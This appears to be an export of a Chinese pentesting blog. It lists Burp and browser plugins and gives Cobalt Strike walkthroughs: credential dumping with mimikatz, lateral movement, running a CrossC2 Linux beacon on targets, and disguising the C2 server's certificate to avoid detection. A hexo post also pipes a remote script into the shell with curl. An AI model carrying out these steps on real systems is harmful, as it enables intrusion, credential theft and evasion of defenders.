<p>项目地址：<a href="https://github.com/portswigger/software-vulnerability-scanner" target="_blank" rel="noopener">https://github.com/portswigger/software-vulnerability-scanner</a>  </p>
<p><img src="//choge.top/2020/09/04/BurpSuite常用插件使用/image-20200920154707104.png" alt="image-20200920154707104"></p>
<h4 id="app自动解密"><a href="#app自动解密" class="headerlink" title="app自动解密"></a>app自动解密</h4><p><a href="https://github.com/lyxhh/lxhToolHTTPDecrypt" target="_blank" rel="noopener">https://github.com/lyxhh/lxhToolHTTPDecrypt</a></p>
<h4 id="xss探测"><a href="#xss探测" class="headerlink" title="xss探测"></a>xss探测</h4><p>项目地址：<a href="https://github.com/nVisium/xssValidator" target="_blank" rel="noopener">https://github.com/nVisium/xssValidator</a></p>
<p>使用方法</p>
<p>在 Terminal 中先切换到 /usr/bin/ 目录，输入：<code>cd  /usr/bin/</code>，再执行 <code>open ~/.bash_profile</code>，在 .bash_profile 中添加以下的内容：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="builtin-name">export</span> <span class="attribute">PATH</span>=<span class="string">"<span class="variable">$PATH</span>:/Users/xxx/phantomjs-2.1.1-macosx/bin:<span class="variable">$PATH</span>"</span></span><br></pre></td></tr></table></figure>

<p><code>source ~/.bash_profile</code>保存配置</p>
<p>xss.js下载下来后放到</p>
<p><code>phantomjs xss.js</code>启动xss.js</p>
<p>进行如下测试</p>
<p><img src="//choge.top/2020/09/04/BurpSuite常用插件使用/image-20200922194900329.png" alt="image-20200922194900329"></p>
<p><img src="//choge.top/2020/09/04/BurpSuite常用插件使用/image-20200922194951546.png" alt="image-20200922194951546"></p>
<p><img src="//choge.top/2020/09/04/BurpSuite常用插件使用/image-20200922195223304.png" alt="image-20200922195223304"></p>
<p><img src="//choge.top/2020/09/04/BurpSuite常用插件使用/image-20200922195327478.png" alt="image-20200922195327478"></p>
<p><img src="//choge.top/2020/09/04/BurpSuite常用插件使用/image-20200922195433631.png" alt="image-20200922195433631"></p>
<p><img src="//choge.top/2020/09/04/BurpSuite常用插件使用/image-20200922195552728.png" alt="image-20200922195552728"></p>
<h5 id="xss-payload收集"><a href="#xss-payload收集" class="headerlink" title="xss payload收集"></a>xss payload收集</h5><p><a href="https://github.com/pgaijin66/XSS-Payloads" target="_blank" rel="noopener">https://github.com/pgaijin66/XSS-Payloads</a></p>
<p><a href="https://github.com/RenwaX23/XSS-Payloads" target="_blank" rel="noopener">https://github.com/RenwaX23/XSS-Payloads</a></p>
<p><a href="https://github.com/foospidy/payloads" target="_blank" rel="noopener">https://github.com/foospidy/payloads</a></p>
<h4 id="bypass-waf"><a href="#bypass-waf" class="headerlink" title="bypass-waf"></a>bypass-waf</h4><p>项目地址： <a href="https://github.com/portswigger/bypass-waf" target="_blank" rel="noopener">https://github.com/portswigger/bypass-waf</a>  </p>
<p><img src="//choge.top/2020/09/04/BurpSuite常用插件使用/image-20200922223337255.png" alt="image-20200922223337255"></p>
<h4 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h4><p>项目地址：<a href="https://github.com/bit4woo/domain_hunter.git" target="_blank" rel="noopener">https://github.com/bit4woo/domain_hunter.git</a></p>
<p><img src="//choge.top/2020/09/04/BurpSuite常用插件使用/image-20200923102146370.png" alt="image-20200923102146370"></p>
<h4 id="logger-plus-plus"><a href="#logger-plus-plus" class="headerlink" title="logger-plus-plus"></a>logger-plus-plus</h4><p>Logger++ 可以查看所有工具发出的请求，如 repeater, intruder, scanner, 插件等。这样我们可以查看到扫描时的一些 payload，以及在扫描时监控网站后台的响应情况。</p>
<p>项目地址：<a href="https://github.com/portswigger/logger-plus-plus" target="_blank" rel="noopener">https://github.com/portswigger/logger-plus-plus</a>  </p>
<h4 id="Wsdler"><a href="#Wsdler" class="headerlink" title="Wsdler"></a>Wsdler</h4><p>Wsdler 可以解析 WSDL 请求，以便使用 repeater 和 scanner 对 WSDL 请求进行测试。可以直接在Bapp Store 安装。</p>
<h4 id="前端加解密"><a href="#前端加解密" class="headerlink" title="前端加解密"></a>前端加解密</h4><p>项目地址：<a href="https://github.com/c0ny1/jsEncrypter" target="_blank" rel="noopener">https://github.com/c0ny1/jsEncrypter</a></p>
<p>下载模板，引入前段加密文件，编写调用加密函数的代码</p>
<p><img src="//choge.top/2020/09/04/BurpSuite常用插件使用/image-20200924204147285.png" alt="image-20200924204147285"></p>
<p>启动phantomjs</p>
<p><img src="//choge.top/2020/09/04/BurpSuite常用插件使用/image-20200924204228521.png" alt="image-20200924204228521"></p>
<p>测试连接成功</p>
<p><img src="//choge.top/2020/09/04/BurpSuite常用插件使用/image-20200924204314340.png" alt="image-20200924204314340"></p>
<p>具体和测试配置如下</p>
<p><img src="//choge.top/2020/09/04/BurpSuite常用插件使用/image-20200924204409412.png" alt="image-20200924204409412"></p>
<p><img src="//choge.top/2020/09/04/BurpSuite常用插件使用/image-20200924204642527.png" alt="image-20200924204642527"></p>
<p>爆破成功</p>
<p><img src="//choge.top/2020/09/04/BurpSuite常用插件使用/image-20200924204752010.png" alt="image-20200924204752010"></p>
<p>回到phantomjs查找出实际对应密码</p>
<p><img src="//choge.top/2020/09/04/BurpSuite常用插件使用/image-20200924204838566.png" alt="image-20200924204838566"></p>
<h4 id="验证码识别"><a href="#验证码识别" class="headerlink" title="验证码识别"></a>验证码识别</h4><p>进行爆破时可识别验证码，具体使用方法查看项目地址</p>
<p>项目地址：<a href="https://github.com/c0ny1/captcha-killer" target="_blank" rel="noopener">https://github.com/c0ny1/captcha-killer</a></p>
<p><img src="//choge.top/2020/09/04/BurpSuite常用插件使用/image-20200924205154924.png" alt="image-20200924205154924"></p>
<h4 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h4><h4 id="Shiro"><a href="#Shiro" class="headerlink" title="Shiro"></a>Shiro</h4><h3 id="项目收集汇总"><a href="#项目收集汇总" class="headerlink" title="项目收集汇总"></a>项目收集汇总</h3><p><a href="https://github.com/xl7dev/BurpSuite/tree/master/Extender" target="_blank" rel="noopener">https://github.com/xl7dev/BurpSuite/tree/master/Extender</a></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.secpulse.com/archives/124527.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/124527.html</a></p>
]]></content>
      <categories>
        <category>Penetration test</category>
      </categories>
      <tags>
        <tag>burp suite</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透之优化Chrome、Firefox浏览器</title>
    <url>/2020/09/02/%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BC%98%E5%8C%96Chrome%E3%80%81Firefox%E6%B5%8F%E8%A7%88%E5%99%A8/</url>
    <content><![CDATA[<p>渗透测试过程中会使用到很多浏览器插件，</p><h3 id="Chrome"><a href="#Chrome" class="headerlink" title="Chrome"></a>Chrome</h3><h4 id="retirejs"><a href="#retirejs" class="headerlink" title="retirejs"></a>retirejs</h4><p>根据js版本号提供漏洞信息</p><p><a href="https://chrome.google.com/webstore/detail/retirejs/moibopkbhjceeedibkbkbchbjnkadmom?utm_source=chrome-ntp-icon" target="_blank" rel="noopener">https://chrome.google.com/webstore/detail/retirejs/moibopkbhjceeedibkbkbchbjnkadmom?utm_source=chrome-ntp-icon</a></p><a id="more"></a>


<h4 id="Penetration-Testing-Kit"><a href="#Penetration-Testing-Kit" class="headerlink" title="Penetration Testing Kit"></a>Penetration Testing Kit</h4><p>自动监测网站使用的框架版本号，并提供漏洞信息</p>
<p><a href="https://chrome.google.com/webstore/detail/penetration-testing-kit/ojkchikaholjmcnefhjlbohackpeeknd?utm_source=chrome-ntp-icon" target="_blank" rel="noopener">https://chrome.google.com/webstore/detail/penetration-testing-kit/ojkchikaholjmcnefhjlbohackpeeknd?utm_source=chrome-ntp-icon</a></p>
<h4 id="Wappalyzeer"><a href="#Wappalyzeer" class="headerlink" title="Wappalyzeer"></a>Wappalyzeer</h4><p>信息收集的插件，可以显示出目标站点的服务器环境用的框架，系统，以及脚本语言等。</p>
<p><a href="https://chrome.google.com/webstore/detail/wappalyzer/gppongmhjkpfnbhagpmjfkannfbllamg?hl=zh-CN" target="_blank" rel="noopener">https://chrome.google.com/webstore/detail/wappalyzer/gppongmhjkpfnbhagpmjfkannfbllamg?hl=zh-CN</a></p>
<h4 id="Proxy-SwitchyOmega"><a href="#Proxy-SwitchyOmega" class="headerlink" title="Proxy SwitchyOmega"></a>Proxy SwitchyOmega</h4><p>代理神器</p>
<p><a href="https://chrome.google.com/webstore/detail/proxy-switchyomega/padekgcemlokbadohgkifijomclgjgif?hl=zh-CN" target="_blank" rel="noopener">https://chrome.google.com/webstore/detail/proxy-switchyomega/padekgcemlokbadohgkifijomclgjgif?hl=zh-CN</a></p>
<h4 id="Shodan"><a href="#Shodan" class="headerlink" title="Shodan"></a>Shodan</h4><p>不解释</p>
<p><a href="https://chrome.google.com/webstore/detail/shodan/jjalcfnidlmpjhdfepjhjbhnhkbgleap" target="_blank" rel="noopener">https://chrome.google.com/webstore/detail/shodan/jjalcfnidlmpjhdfepjhjbhnhkbgleap</a></p>
<h4 id="IE-Tab"><a href="#IE-Tab" class="headerlink" title="IE Tab"></a>IE Tab</h4><p>Chrome兼容IE插件</p>
<p><a href="https://chrome.google.com/webstore/detail/ie-tab/hehijbfgiekmjfkfjpbkbammjbdenadd" target="_blank" rel="noopener">https://chrome.google.com/webstore/detail/ie-tab/hehijbfgiekmjfkfjpbkbammjbdenadd</a></p>
<h4 id="User-Agent-Switcher"><a href="#User-Agent-Switcher" class="headerlink" title="User-Agent Switcher"></a>User-Agent Switcher</h4><p>UA头切换</p>
<p><a href="https://chrome.google.com/webstore/detail/user-agent-switcher-for-c/djflhoibgkdhkhhcedjiklpkjnoahfmg" target="_blank" rel="noopener">https://chrome.google.com/webstore/detail/user-agent-switcher-for-c/djflhoibgkdhkhhcedjiklpkjnoahfmg</a></p>
<h4 id="d3coder"><a href="#d3coder" class="headerlink" title="d3coder"></a>d3coder</h4><p>解码工具</p>
<p><a href="https://chrome.google.com/webstore/detail/d3coder/gncnbkghencmkfgeepfaonmegemakcol" target="_blank" rel="noopener">https://chrome.google.com/webstore/detail/d3coder/gncnbkghencmkfgeepfaonmegemakcol</a></p>
<h4 id="Cookie-Editor"><a href="#Cookie-Editor" class="headerlink" title="Cookie Editor"></a>Cookie Editor</h4><p>Cookie编辑器</p>
<p><a href="https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg" target="_blank" rel="noopener">https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg</a></p>
<h4 id="IP-Address-and-Domain-Information"><a href="#IP-Address-and-Domain-Information" class="headerlink" title="IP Address and Domain Information"></a>IP Address and Domain Information</h4><p>IP信息</p>
<p><a href="https://chrome.google.com/webstore/detail/ip-address-and-domain-inf/lhgkegeccnckoiliokondpaaalbhafoa" target="_blank" rel="noopener">https://chrome.google.com/webstore/detail/ip-address-and-domain-inf/lhgkegeccnckoiliokondpaaalbhafoa</a></p>
<h4 id="hackbar"><a href="#hackbar" class="headerlink" title="hackbar"></a>hackbar</h4><p>不解释</p>
<p><a href="https://chrome.google.com/webstore/detail/hackbar/ginpbkfigcoaokgflihfhhmglmbchinc" target="_blank" rel="noopener">https://chrome.google.com/webstore/detail/hackbar/ginpbkfigcoaokgflihfhhmglmbchinc</a></p>
<h4 id="Tampermonkey"><a href="#Tampermonkey" class="headerlink" title="Tampermonkey"></a>Tampermonkey</h4><p>油猴脚本</p>
<p><a href="https://chrome.google.com/webstore/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo" target="_blank" rel="noopener">https://chrome.google.com/webstore/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo</a></p>
<h3 id="Firefox"><a href="#Firefox" class="headerlink" title="Firefox"></a>Firefox</h3><h4 id="User-Agent-Switcher-and-Manager"><a href="#User-Agent-Switcher-and-Manager" class="headerlink" title="User-Agent Switcher and Manager"></a>User-Agent Switcher and Manager</h4><p>UA头切换</p>
<p><a href="https://addons.mozilla.org/en-US/firefox/addon/user-agent-string-switcher/?src=search" target="_blank" rel="noopener">https://addons.mozilla.org/en-US/firefox/addon/user-agent-string-switcher/?src=search</a></p>
<h4 id="hackbar-1"><a href="#hackbar-1" class="headerlink" title="hackbar"></a>hackbar</h4><p>不解释</p>
<p><a href="https://addons.mozilla.org/en-US/firefox/addon/hackbar-quantum/?src=search" target="_blank" rel="noopener">https://addons.mozilla.org/en-US/firefox/addon/hackbar-quantum/?src=search</a></p>
<h4 id="Flagfox"><a href="#Flagfox" class="headerlink" title="Flagfox"></a>Flagfox</h4><p>显示国家图标</p>
<p><a href="https://addons.mozilla.org/en-US/firefox/addon/flagfox/?src=search" target="_blank" rel="noopener">https://addons.mozilla.org/en-US/firefox/addon/flagfox/?src=search</a></p>
<h4 id="IP-Address-and-Domain-Information-1"><a href="#IP-Address-and-Domain-Information-1" class="headerlink" title="IP Address and Domain Information"></a>IP Address and Domain Information</h4><p>ip信息</p>
<p><a href="https://addons.mozilla.org/en-US/firefox/addon/ip-address-and-domain-info/?src=search" target="_blank" rel="noopener">https://addons.mozilla.org/en-US/firefox/addon/ip-address-and-domain-info/?src=search</a></p>
<h4 id="Cookie-Quick-Manager"><a href="#Cookie-Quick-Manager" class="headerlink" title="Cookie Quick Manager"></a>Cookie Quick Manager</h4><p>Cookie编辑器</p>
<p><a href="https://addons.mozilla.org/en-US/firefox/addon/cookie-quick-manager/?src=search" target="_blank" rel="noopener">https://addons.mozilla.org/en-US/firefox/addon/cookie-quick-manager/?src=search</a></p>
<h4 id="retire-js"><a href="#retire-js" class="headerlink" title="retire.js"></a>retire.js</h4><p>根据js版本号提供漏洞信息</p>
<p><a href="https://addons.mozilla.org/en-US/firefox/addon/retire-js/?src=search" target="_blank" rel="noopener">https://addons.mozilla.org/en-US/firefox/addon/retire-js/?src=search</a></p>
<h4 id="NoScript-Security-Suite"><a href="#NoScript-Security-Suite" class="headerlink" title="NoScript Security Suite"></a>NoScript Security Suite</h4><p>浏览器JS控制器</p>
<p><a href="https://addons.mozilla.org/en-US/firefox/addon/noscript/?src=search" target="_blank" rel="noopener">https://addons.mozilla.org/en-US/firefox/addon/noscript/?src=search</a></p>
<h4 id="Wappalyzer"><a href="#Wappalyzer" class="headerlink" title="Wappalyzer"></a>Wappalyzer</h4><p>信息收集的插件，可以显示出目标站点的服务器环境用的框架，系统，以及脚本语言等。</p>
<p><a href="https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/?src=search" target="_blank" rel="noopener">https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/?src=search</a></p>
<p>####Tampermonkey</p>
<p>油猴脚本</p>
<p><a href="https://addons.mozilla.org/en-US/firefox/addon/tampermonkey/?src=search" target="_blank" rel="noopener">https://addons.mozilla.org/en-US/firefox/addon/tampermonkey/?src=search</a></p>
<p>####Shodan.io</p>
<p>Shodan</p>
<p><a href="https://addons.mozilla.org/en-US/firefox/addon/shodan_io/?src=search" target="_blank" rel="noopener">https://addons.mozilla.org/en-US/firefox/addon/shodan_io/?src=search</a></p>
<h4 id="Proxy-SwitchyOmega-1"><a href="#Proxy-SwitchyOmega-1" class="headerlink" title="Proxy SwitchyOmega"></a>Proxy SwitchyOmega</h4><p>代理神器</p>
<p><a href="https://addons.mozilla.org/en-US/firefox/addon/switchyomega/?src=search" target="_blank" rel="noopener">https://addons.mozilla.org/en-US/firefox/addon/switchyomega/?src=search</a></p>
<h4 id="Copyfish"><a href="#Copyfish" class="headerlink" title="Copyfish"></a>Copyfish</h4><p>ocr插件</p>
<p><a href="https://addons.mozilla.org/en-US/firefox/addon/copyfish-ocr-software/?src=search" target="_blank" rel="noopener">https://addons.mozilla.org/en-US/firefox/addon/copyfish-ocr-software/?src=search</a></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cesafe.com/html/2557.html" target="_blank" rel="noopener">https://www.cesafe.com/html/2557.html</a></p>
]]></content>
      <categories>
        <category>Penetration test</category>
      </categories>
      <tags>
        <tag>Chrome</tag>
      </tags>
  </entry>
  <entry>
    <title>Cobaltstrike之Powershell扩展</title>
    <url>/2020/09/01/Cobaltstrike%E4%B9%8BPowershell%E6%89%A9%E5%B1%95/</url>
    <content><![CDATA[<p>本文主要收集Powershell扩展脚本</p><h3 id="收集项目"><a href="#收集项目" class="headerlink" title="收集项目"></a>收集项目</h3><p><a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">https://github.com/samratashok/nishang</a></p><p><a href="https://www.anquanke.com/post/id/84896" target="_blank" rel="noopener">https://www.anquanke.com/post/id/84896</a></p><p><a href="https://www.anquanke.com/post/id/84939" target="_blank" rel="noopener">https://www.anquanke.com/post/id/84939</a></p><h3 id="使用例子"><a href="#使用例子" class="headerlink" title="使用例子"></a>使用例子</h3><p>以使用Check-VM.ps1为例，检查是否为虚拟机</p><a id="more"></a>




<p>项目地址：</p>
<p><a href="https://github.com/samratashok/nishang/blob/master/Gather/Check-VM.ps1" target="_blank" rel="noopener">https://github.com/samratashok/nishang/blob/master/Gather/Check-VM.ps1</a></p>
<p><code>powershell-import</code>进行导入下载下来的脚本</p>
<p><img src="//choge.top/2020/09/01/Cobaltstrike之Powershell扩展/image-20200901151356102.png" alt="image-20200901151356102"></p>
<p><img src="//choge.top/2020/09/01/Cobaltstrike之Powershell扩展/image-20200901151451325.png" alt="image-20200901151451325"></p>
<p>脚本代码</p>
<p><img src="//choge.top/2020/09/01/Cobaltstrike之Powershell扩展/image-20200901151638779.png" alt="image-20200901151638779"></p>
<p>运行Check-VM.ps1脚本函数<code>powershell Check-VM</code></p>
<p><img src="//choge.top/2020/09/01/Cobaltstrike之Powershell扩展/image-20200901151721897.png" alt="image-20200901151721897"></p>
<h3 id="信息收集脚本"><a href="#信息收集脚本" class="headerlink" title="信息收集脚本"></a>信息收集脚本</h3><p>脚本地址</p>
<p><a href="https://github.com/samratashok/nishang/blob/master/Gather/Get-Information.ps1" target="_blank" rel="noopener">https://github.com/samratashok/nishang/blob/master/Gather/Get-Information.ps1</a></p>
<p>使用如下</p>
<p><img src="//choge.top/2020/09/01/Cobaltstrike之Powershell扩展/image-20200901151936475.png" alt="image-20200901151936475"></p>
<p><img src="//choge.top/2020/09/01/Cobaltstrike之Powershell扩展/image-20200901151902644.png" alt="image-20200901151902644"></p>
<p>###上传到目标机运行</p>
<p>powershell上传到目标机器后执行<code>shell powershell -f  xx.psl</code></p>
]]></content>
      <categories>
        <category>Cobalt Strike</category>
      </categories>
      <tags>
        <tag>cs</tag>
      </tags>
  </entry>
  <entry>
    <title>Cobaltstrike批量上线（横向移动）</title>
    <url>/2020/08/31/Cobaltstrike%E6%89%B9%E9%87%8F%E4%B8%8A%E7%BA%BF%EF%BC%88%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%EF%BC%89/</url>
    <content><![CDATA[<p>本文主要记录Cobaltstrike横向移动的使用方法。</p><h3 id="账号密码获取"><a href="#账号密码获取" class="headerlink" title="账号密码获取"></a>账号密码获取</h3><p>首先需要通过已上线主机进行Run Mimikatz或者在beacon中执行hashdump进行账号密码等信息收集。然后对其他主机进行存活探测进行上线。</p><p>Run Mimikatz或者hashdump后获取信息如下</p><p><img src="//choge.top/2020/08/31/Cobaltstrike批量上线（横向移动）/image-20200831161527270.png" alt="image-20200831161527270"></p><h3 id="存活探测"><a href="#存活探测" class="headerlink" title="存活探测"></a>存活探测</h3><p>使用cs自带的Port Scan进行端口扫描</p><a id="more"></a>




<p><img src="//choge.top/2020/08/31/Cobaltstrike批量上线（横向移动）/image-20200831161601960.png" alt="image-20200831161601960"></p>
<p>此处选择暂选择445，3389，22端口，发现方式选择icmp，实际情况可以根据需要作出选择。</p>
<p><img src="//choge.top/2020/08/31/Cobaltstrike批量上线（横向移动）/image-20200831161843238.png" alt="image-20200831161843238"></p>
<p>扫描情况如下</p>
<p><img src="//choge.top/2020/08/31/Cobaltstrike批量上线（横向移动）/image-20200831161920514.png" alt="image-20200831161920514"></p>
<p>可以在Targets中查看扫描后的主机情况</p>
<p><img src="//choge.top/2020/08/31/Cobaltstrike批量上线（横向移动）/image-20200831162029109.png" alt="image-20200831162029109"></p>
<h3 id="批量上线"><a href="#批量上线" class="headerlink" title="批量上线"></a>批量上线</h3><p>选择一台主机也可以多选机器Windows主机可通过psexec，psexec64，psexec_psh，winrm，winrm64等模式上线。其中winrm和winrm64模式在预控下可以使用http方式上线，如在非域控制情况下必须使用https模式上线，使用winrm或winrm64的优势是可以直接穿透防火墙。</p>
<p><img src="//choge.top/2020/08/31/Cobaltstrike批量上线（横向移动）/image-20200831163220912.png" alt="image-20200831163220912"></p>
<p>选择之前获取的用户信息，选择对应Linster和Session</p>
<p><img src="//choge.top/2020/08/31/Cobaltstrike批量上线（横向移动）/image-20200831163322473.png" alt="image-20200831163322473"></p>
<p>成功上线</p>
<p><img src="//choge.top/2020/08/31/Cobaltstrike批量上线（横向移动）/image-20200831163457903.png" alt="image-20200831163457903"></p>
<h3 id="不出网情况下上线"><a href="#不出网情况下上线" class="headerlink" title="不出网情况下上线"></a>不出网情况下上线</h3><p>首先建立一个smb或tcp的监听器</p>
<p><img src="//choge.top/2020/08/31/Cobaltstrike批量上线（横向移动）/image-20200831170005823.png" alt="image-20200831170005823"></p>
<p><img src="//choge.top/2020/08/31/Cobaltstrike批量上线（横向移动）/image-20200831170053768.png" alt="image-20200831170053768"></p>
<p>选择账号密码信号，选择smb监听器，选择Session</p>
<p><img src="//choge.top/2020/08/31/Cobaltstrike批量上线（横向移动）/image-20200831170242437.png" alt="image-20200831170242437"></p>
<p>成功上线</p>
<p><img src="//choge.top/2020/08/31/Cobaltstrike批量上线（横向移动）/image-20200831170325488.png" alt="image-20200831170325488"></p>
<p>使用tcp的监听器</p>
<p><img src="//choge.top/2020/08/31/Cobaltstrike批量上线（横向移动）/image-20200831170503379.png" alt="image-20200831170503379"></p>
<p>同样成功上线</p>
<p><img src="//choge.top/2020/08/31/Cobaltstrike批量上线（横向移动）/image-20200831170637325.png" alt="image-20200831170637325"></p>
<p>###Linux批量上线</p>
<p>Linux可以选择ssh或ssh-key的方式上线</p>
<p><img src="//choge.top/2020/08/31/Cobaltstrike批量上线（横向移动）/image-20200831171133277.png" alt="image-20200831171133277"></p>
<p>手动填入账号密码后选择Session</p>
<p><img src="//choge.top/2020/08/31/Cobaltstrike批量上线（横向移动）/image-20200831171237085.png" alt="image-20200831171237085"></p>
<p>也可以在Credentials中手工添加Linux的账号密码后在SSH Login中选中账号密码上线</p>
<p><img src="//choge.top/2020/08/31/Cobaltstrike批量上线（横向移动）/image-20200831171627394.png" alt="image-20200831171627394"></p>
<p>成功上线</p>
<p><img src="//choge.top/2020/08/31/Cobaltstrike批量上线（横向移动）/image-20200831171319476.png" alt="image-20200831171319476"></p>
]]></content>
      <categories>
        <category>Cobalt Strike</category>
      </categories>
      <tags>
        <tag>cs</tag>
      </tags>
  </entry>
  <entry>
    <title>Cobaltstrike之Linux上线</title>
    <url>/2020/08/31/Cobaltstrike%E4%B9%8BLinux%E4%B8%8A%E7%BA%BF/</url>
    <content><![CDATA[<p>本文主要记录Cobaltstrike的Linux上线方法。插件地址如下：</p><p><a href="https://github.com/gloxec/CrossC2.git" target="_blank" rel="noopener">https://github.com/gloxec/CrossC2.git</a></p><p>Cross C2是一个支持Linux &amp; MacOS系统的拓展插件，支持用户自定义生成的动态库，以无文件落地的方式从内存中加载执行动态库或可执行文件。</p><a id="more"></a>


<p>先建立一个https监听器</p>
<p><img src="//choge.top/2020/08/31/Cobaltstrike之Linux上线/image-20200831101934117.png" alt="image-20200831101934117"></p>
<p>将src目录中的genCrossC2.Linux复制到Cobalt Strike服务端<code>chmod +x</code>赋予权限，然后执行命令：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">./genCrossC2.Linux</span> <span class="string">监听IP</span> <span class="string">监听端口</span> <span class="literal">null</span> <span class="literal">null</span> <span class="string">Linux</span> <span class="string">x64</span> <span class="string">Linux</span></span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/08/31/Cobaltstrike之Linux上线/image-20200831102300938.png" alt="image-20200831102300938"></p>
<p>将生成的Linux文件放到Linux机器中，<code>chmod +x</code>赋予权限后<code>./Linux</code>执行后成功上线</p>
<p><img src="//choge.top/2020/08/31/Cobaltstrike之Linux上线/image-20200831102955386.png" alt="image-20200831102955386"></p>
<p>可以上线但无法执行命令，重复上述操作，换成3.14版本可成功执行命令</p>
<p><img src="//choge.top/2020/08/31/Cobaltstrike之Linux上线/image-20200831111942838.png" alt="image-20200831111942838"></p>
]]></content>
      <categories>
        <category>Cobalt Strike</category>
      </categories>
      <tags>
        <tag>cs</tag>
      </tags>
  </entry>
  <entry>
    <title>记录一次hexo迁移</title>
    <url>/2020/08/25/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1hexo%E8%BF%81%E7%A7%BB/</url>
    <content><![CDATA[<p>记录一次hexo的迁移，迁移环境为mac到mac。由于账户下mac出现了问题，只有新建用户才能解决，要将hexo迁移到新的用户。</p><h3 id="安装基础环境"><a href="#安装基础环境" class="headerlink" title="安装基础环境"></a>安装基础环境</h3><p>安装homebrew</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/bin/zsh -c &quot;$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/Homebrew.sh)&quot;</span><br></pre></td></tr></table></figure><a id="more"></a>



<p>安装git，Node.js，nmp，自行百度。</p>
<h3 id="配置SSH-KEY"><a href="#配置SSH-KEY" class="headerlink" title="配置SSH KEY"></a>配置SSH KEY</h3><p>用户目录下创建.shh文件夹</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cd</span> ~<span class="string">/.</span> ssh</span><br><span class="line">ssh-keygen -t rsa -C <span class="string">"邮件地址"</span>   <span class="comment">#一路默认，输入两次密码</span></span><br><span class="line">ssh -T git@github.com  <span class="comment">#测试是否成功</span></span><br></pre></td></tr></table></figure>

<p>github配置</p>
<p>在本地生成的id_rsa.pub内容复制黏贴到如下位置</p>
<p><img src="//choge.top/2020/08/25/记录一次hexo迁移/image-20200825171859092.png" alt="image-20200825171859092"></p>
<h3 id="配置用户名和邮箱"><a href="#配置用户名和邮箱" class="headerlink" title="配置用户名和邮箱"></a>配置用户名和邮箱</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">git<span class="built_in"> config </span>--global user.name <span class="string">"github的用户名"</span></span><br><span class="line">git<span class="built_in"> config </span>--global user.email  <span class="string">"xxx@qq.com"</span></span><br></pre></td></tr></table></figure>

<h3 id="关联github项目"><a href="#关联github项目" class="headerlink" title="关联github项目"></a>关联github项目</h3><p>进入到拷贝过来的博客目录，删除node_modules、public .git、.deploy_git等文件或者文件夹。mac下同时按住shift+command+.后可显示隐藏文件</p>
<p>在博客目录下关联github项目</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">git init</span><br><span class="line">git remote add origin git@github<span class="selector-class">.com</span>:xxxxx/xxxxx<span class="selector-class">.github</span><span class="selector-class">.io</span><span class="selector-class">.git</span></span><br></pre></td></tr></table></figure>

<h3 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h3><figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">npm <span class="keyword">install</span> –g hexo  <span class="comment">#不要在博客目录下安装，这样会安装不上</span></span><br></pre></td></tr></table></figure>

<h3 id="安装项目依赖"><a href="#安装项目依赖" class="headerlink" title="安装项目依赖"></a>安装项目依赖</h3><figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">npm <span class="keyword">install</span></span><br></pre></td></tr></table></figure>

<p>安装完成后<code>hexo g</code>、<code>hexo s</code>后本地预览，大功告成。</p>
<h3 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><p><a href="https://blog.csdn.net/Calvin_zhou/article/details/85218157" target="_blank" rel="noopener">https://blog.csdn.net/Calvin_zhou/article/details/85218157</a></p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Cobaltstrike之流量隐藏</title>
    <url>/2020/08/16/Cobaltstrike%E4%B9%8B%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F/</url>
    <content><![CDATA[<p>汇总一些cs的常见流量隐藏技术</p><h2 id="证书修改"><a href="#证书修改" class="headerlink" title="证书修改"></a>证书修改</h2><p>Keytool是一个java数据证书的管理工具，Keytool将密钥 和 证书 存放在一个称为 keystore 的文件中,即.store后缀的文件中。修改.store文件可以隐藏teamsrver的特征，避免被网络空间搜索引擎发现，同时需要修改默认端口。查看证书内容<code>keytool -list -v -keystore cobaltstrike.store</code>，可以看到很多特征信息。</p><a id="more"></a>

<p><img src="//choge.top/2020/08/16/Cobaltstrike之流量隐藏/image-20200821170818974.png" alt="image-20200821170818974"></p>
<p>先删除store文件，按照如下代码修改证书信息</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">keytool -keystore cobaltstrike<span class="selector-class">.store</span> -storepass <span class="number">123456</span> -keypass <span class="number">123456</span> -genkey -keyalg RSA -alias baidu<span class="selector-class">.com</span> -dname <span class="string">"CN=CC, OU=HW, O=IBM, L=AD, ST=AC, C=AV"</span></span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/08/16/Cobaltstrike之流量隐藏/image-20200821171645900.png" alt="image-20200821171645900"></p>
<p>生成证书文件</p>
